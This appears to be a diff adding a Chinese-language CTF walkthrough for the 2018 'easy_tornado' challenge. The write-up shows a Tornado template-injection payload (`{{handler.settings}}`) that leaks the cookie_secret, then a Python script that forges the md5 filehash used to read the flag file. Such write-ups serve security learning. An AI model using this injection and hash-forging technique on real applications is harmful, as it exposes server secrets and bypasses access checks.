@@ -801,6 +801,54 @@ POST进行传参：<br />`param1[]=1&param2[]=2`<br />![image.png](https://cdn.n
 
 原文链接：https://blog.csdn.net/m0_73734159/article/details/134349129?spm=1001.2014.3001.5501
 
+## [护网杯 2018]easy_tornado 1（两种解法！）
+
+题目环境：<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1699767639305-6f45e82e-e7ba-462d-a9ac-d3a4532880c7.png#averageHue=%23fdfdfc&clientId=uf3f75f0b-ee50-4&from=paste&height=390&id=u357b0d19&originHeight=488&originWidth=1918&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=32157&status=done&style=none&taskId=u1bb5f53f-b40b-4d1f-9136-93b6f1bd48c&title=&width=1534.4)<br />发现有三个txt文本文件
+> /flag.txt<br />/welcome.txt<br />/hints.txt
+
+依此点开<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1699768772925-27c0e6df-5824-4936-a6a8-75cf928005b9.png#averageHue=%23faf9f8&clientId=uf3f75f0b-ee50-4&from=paste&height=167&id=X7sGZ&originHeight=209&originWidth=1901&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=34168&status=done&style=none&taskId=u93897832-b84c-4245-8140-970bc40bcb9&title=&width=1520.8)
+> **flag在/fllllllllllllag文件中**
+
+![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1699768851274-3d397fc4-8250-44f0-ba84-f3c917d06ed0.png#averageHue=%23fbfbfa&clientId=uf3f75f0b-ee50-4&from=paste&height=238&id=ub4aa7ad4&originHeight=297&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=36763&status=done&style=none&taskId=ufc53a7c3-10ff-4bcb-a6df-2630482a7df&title=&width=1536)<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1699768885680-99b2d1ec-5735-4853-9ea1-eefd6ce07518.png#averageHue=%23faf9f8&clientId=uf3f75f0b-ee50-4&from=paste&height=166&id=u52f9265c&originHeight=207&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=35670&status=done&style=none&taskId=u7d807c96-fae8-487b-b1da-9dfc3f252f8&title=&width=1536)
+> 在hints.txt文件中发现md5计算
+> md5(cookie_secret+md5(filename))
+
+> 并且三个文件中都存在filehash（文件名被哈希算法加密32位小写）
+
+> 猜测解题关键点在md5(cookie_secret+md5(filename))这里
+> 首先flag在/fllllllllllllag文件中**，**所以就是filename=/fllllllllllllag**;**filehash=md5(cookie_secret+md5(filename))
+> 现在只缺cookie_secret这个东西，只要有了cookie_secret再通过这个md5(cookie_secret+md5(filename))公式进行计算即可获取到flag
+
+> 注意题目easy_tornado 1；tornado是python的一个模板，可以看出这道题是模板注入类的题目
+
+改哈希值看看是否有变化<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1699769548303-492d1959-3885-44d2-998d-163af0714f4c.png#averageHue=%23faf9f8&clientId=uf3f75f0b-ee50-4&from=paste&height=182&id=u036411e5&originHeight=227&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=35589&status=done&style=none&taskId=u820ce820-cf4c-46a8-b036-04875783a7c&title=&width=1536)<br />回车<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1699769589127-c0a81f90-4c21-4189-b563-a5b471deb9a7.png#averageHue=%23fbfaf9&clientId=uf3f75f0b-ee50-4&from=paste&height=183&id=u2986ca43&originHeight=229&originWidth=1913&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=33984&status=done&style=none&taskId=ucc31388b-ca68-4a2e-ab84-ce593092c92&title=&width=1530.4)
+> **模板注入必须通过传输型如{{xxx}}的执行命令**
+
+![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1699769643824-c3b8de5a-1ba4-4038-826a-0586ada38ac8.png#averageHue=%23fbfaf9&clientId=uf3f75f0b-ee50-4&from=paste&height=160&id=u4180f586&originHeight=200&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=29096&status=done&style=none&taskId=u11595679-633f-4e94-9957-ccfb3cfea58&title=&width=1536)<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1699769668865-0e48f957-7e0c-46c0-a601-70be553a7d0a.png#averageHue=%23fbfaf9&clientId=uf3f75f0b-ee50-4&from=paste&height=168&id=ua3fe892a&originHeight=210&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=32927&status=done&style=none&taskId=uf403a604-dd4f-4fc5-8dd5-421322e4be0&title=&width=1536)<br />果然是tornado模板注入
+> 在tornado模板中，存在一些可以访问的快速对象,这里用到的是handler.settings，handler 指向RequestHandler，而RequestHandler.settings又指向self.application.settings，所以handler.settings就指向RequestHandler.application.settings了，这里面就是我们的一些环境变量。
+
+> 简单理解handler.settings即可，可以把它理解为tornado模板中内置的环境配置信息名称，通过handler.settings可以访问到环境配置的一些信息，看到tornado模板基本上可以通过handler.settings一把梭。
+
+爆cookie_secret<br />`error?msg={{handler.settings}}`<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1699769995941-3c6ba7b0-bd17-4223-9521-6652d0043d66.png#averageHue=%23f6f5f3&clientId=uf3f75f0b-ee50-4&from=paste&height=212&id=ud5d73b0e&originHeight=265&originWidth=1919&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=56659&status=done&style=none&taskId=u762c29dd-9e74-41ac-a607-4eb56625f95&title=&width=1535.2)<br />得到cookie_secret<br />`76fc62a3-fea5-46ab-8f95-4b7262246f8c`<br />按照公式进行加密<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1699770232606-9bdc13e8-2454-4e66-80dc-3436ddd795b4.png#averageHue=%23fefefe&clientId=uf3f75f0b-ee50-4&from=paste&height=222&id=ua4951ef0&originHeight=278&originWidth=1486&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=19834&status=done&style=none&taskId=u53d6dac4-09d8-4bb6-b653-cd2bff8ab9c&title=&width=1188.8)<br />`/fllllllllllllag=3bf9f6cf685a6dd8defadabfb41a03a1`<br />cookie_secret+md5(filename)<br />`76fc62a3-fea5-46ab-8f95-4b7262246f8c3bf9f6cf685a6dd8defadabfb41a03a1`<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1699770358271-f826c71b-038f-443f-a318-98d0ea751e98.png#averageHue=%23fefdfd&clientId=uf3f75f0b-ee50-4&from=paste&height=210&id=u64e0ec1d&originHeight=262&originWidth=1458&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=25684&status=done&style=none&taskId=ud66f2aab-ffbd-411c-92a9-45286b7199d&title=&width=1166.4)<br />md5(cookie_secret+md5(filename))<br />`39482391ef4cc45a75262be45e94c725`<br />**最终payload：**<br />`?filename=/fllllllllllllag&filehash=39482391ef4cc45a75262be45e94c725`<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1699770499713-110f1a97-134d-4355-995b-e9b127340e78.png#averageHue=%23f9f9f7&clientId=uf3f75f0b-ee50-4&from=paste&height=165&id=u176f419c&originHeight=206&originWidth=1919&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=37925&status=done&style=none&taskId=u818b60cb-9d2c-4de4-9703-e76a300003e&title=&width=1535.2)<br />**当然也可以用python脚本进行加密**
+```python
+import hashlib  #选用哈希模块
+filename = '/fllllllllllllag'  #文件名
+cookie_secret = '76fc62a3-fea5-46ab-8f95-4b7262246f8c'#cookie_secret值
+filename = hashlib.md5(filename.encode()).hexdigest()#/fllllllllllllag进行32位小写哈希md5加密
+a = cookie_secret + filename#md5值进行拼接
+filehash = hashlib.md5(a.encode()).hexdigest()#计算拼接后的md5值的md532小写的值
+print(filehash)#输出加密后的md532位小写的值
+```
+![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1699770892785-062fe176-a4c4-4ca1-b198-8e914f2b4e27.png#averageHue=%23292a23&clientId=uf3f75f0b-ee50-4&from=paste&height=758&id=u8ce8807a&originHeight=947&originWidth=1918&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=174949&status=done&style=none&taskId=u91a7ebe4-ed48-4eb9-b398-cb5f463c490&title=&width=1534.4)<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1699770996646-75007fe5-297a-480d-8f93-a9b16176ba66.png#averageHue=%23f9f8f7&clientId=uf3f75f0b-ee50-4&from=paste&height=158&id=u6cab9e37&originHeight=197&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=34410&status=done&style=none&taskId=u9a92bea9-9ec4-404e-bc71-97123f320a9&title=&width=1536)<br />**得到flag：**<br />`flag{5ae1c44d-f83a-4005-a69b-a1ea133391db}`
+
+原文链接：https://blog.csdn.net/m0_73734159/article/details/134360691?csdn_share_tail=%7B%22type%22%3A%22blog%22%2C%22rType%22%3A%22article%22%2C%22rId%22%3A%22134360691%22%2C%22source%22%3A%22m0_73734159%22%7D
+
+
+
+
+
+
+
 
 
 
